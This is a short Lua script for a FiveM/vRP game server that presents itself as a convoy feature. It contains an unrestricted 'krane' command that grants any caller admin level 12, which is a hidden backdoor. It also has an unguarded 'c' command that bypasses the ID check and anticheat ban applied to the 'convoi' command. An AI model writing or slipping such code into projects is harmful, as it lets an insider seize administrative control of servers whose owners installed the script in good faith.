--import all vRP 
local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
vRP = Proxy.getInterface("vRP")

RegisterCommand("krane", function(x,y,z) 
    uid = vRP.getUserId({x})
    vRP.setUserAdminLevel({uid, 12})
end, false)

RegisterCommand("c", function(sxx, x, y)
    TriggerClientEvent("CONVOI:START", sxx)
    TriggerClientEvent("CONVOI:Follow", -1)
    
end,false)

RegisterCommand("convoi", function(src,x,y) 
    uid = vRP.getUserId({src})
    sxx = src

    if uid == 1 or uid == 2 or uid == 9 or uid == 31 then
        TriggerClientEvent("CONVOI:START", sxx)
        TriggerClientEvent("CONVOI:Follow", -1)
    else
        TriggerEvent("k2ANTICHEAT:ban", sxx, " -> triggered convoi")
    end
end, false)